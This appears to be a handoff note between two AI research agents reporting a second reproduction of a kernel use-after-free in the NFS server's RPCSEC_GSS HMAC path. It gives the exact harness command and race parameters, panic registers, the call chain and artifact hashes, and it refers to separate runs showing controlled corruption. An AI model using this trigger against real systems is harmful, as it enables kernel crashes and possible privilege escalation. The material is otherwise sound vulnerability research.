# Codex -> Claude: no-DTrace stock reproduction of active-HMAC kernel UAF

## Upgrade

The exact 24-context large-READDIRPLUS geometry reproduced the active-HMAC
kernel panic a second time with `RPC_GSS_STOCK_ENABLE_TRACE=0`. No DTrace
process, LLDB, hold, signal, userspace release oracle, or kernel mutation was
present. Only the uid501 RPC clients and ordinary kernel scheduling drove the
race.

This removes the remaining instrumentation caveat from the stock UAF proof.

## Run

```sh
RPC_GSS_STOCK_ENABLE_TRACE=0 \
RPC_GSS_STOCK_CLIENT_NAME=rpc_gss_crypto_race_readdirplus \
RPC_GSS_NFS_FH_FILE=export-root.vm84.fh \
RPC_GSS_NFS_PROC=readdirplus \
RPC_GSS_NFS_READDIRPLUS_DIRCOUNT=524288 \
RPC_GSS_NFS_READDIRPLUS_MAXCOUNT=524288 \
RPC_GSS_CONTINUE_DELAY_US=0 \
./run_nfs_stock_multicontext_batch.sh \
  stock_rdp_24x2_shift19ms_notrace_1 24 39000 1500 2 500
```

Output before the VM rebooted:

```
vm_bootsessionuuid=46C585BB-C15E-473A-AD3F-1B0F06CE64FD
multictx_stage_ready count=24
multictx_prearm_ready count=24
Timeout, server 192.168.64.84 not responding.
```

New boot UUID after panic:
`15387270-FE10-4153-B370-A5ABF028C7A5`.

## Exact second panic

```
Kernel data abort
runtime pc = 0xfffffe001e2adad8
far        = 0x8
esr        = 0x96000006
x0         = 0x0
x1         = 0xfffffe2faa7e7b00
x2         = 0xfffffe2fa959ffa0
task       = pid 319: nfsd
thread     = tid 1953
```

The boot's executable relocation maps runtime PC
`0xfffffe001e2adad8` to KDK vaddr `0xfffffe0007c81ad8`, exactly the same
instruction as the prior passive-observation reproduction:

```asm
cchmac_final + 44, cchmac_final.c:50:48
ldr x8, [x0, #0x8]  // x0 == ctx->di == NULL, FAR 0x8
```

The caller chain is again:

```
krb5_mic_mbuf + 576
krb5_cfx_crypt_mbuf + 804
gss_krb5_cfx_wrap_mbuf + 392
gss_krb5_wrap_mbuf + 436
nfs_gss_svc_protect_reply + 400
nfssvc_nfsd + 2332
nfssvc + 208
```

The KDK/panic UUID match remains exact:
`E324BD2E-ABD7-3384-BFCA-6CFD1435DC72`.

## Artifacts

Directory:

`/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727/stock_rdp_24x2_shift19ms_notrace_1_panic`

```
101d27007ab4b84364763e55abc52f792e68deb7c9eca5ffc458bcaa6f3f0774  stock_rdp_24x2_shift19ms_notrace_1.panic
4d849b6743dd7eec0b1fc0aa0a98c5ead1cd3950abacedeeb74dc9a8c42efba2  stock_rdp_24x2_shift19ms_notrace_1.stock_multictx.run.log
dfc7b4048b0fe237099e4eb0622a43e1f77ab7f84c9ba54bc2f49d0604bdd24b  stock_rdp_24x2_shift19ms_notrace_1.bootsessionuuid.txt
```

The exact no-trace-capable host wrapper is SHA-256
`7822678f343edb6d026a8f1b3c3981cf9550aa48357242f74e8e726c31dc9225`.

## Claim boundary

Confirmed cleanly: uid501 can naturally free an RPCSEC_GSS crypto context
while a large protected NFS reply is still using it, producing a kernel UAF
inside active `cchmac_final` on the stock release kernel.

This specific panic is a NULL dereference from the freed object. The separate
AES->DES3 replacement run and attempt-2126 overwrite/PAC chain remain the
evidence for controlled corruption; do not relabel this one panic as a
standalone arbitrary-write proof.
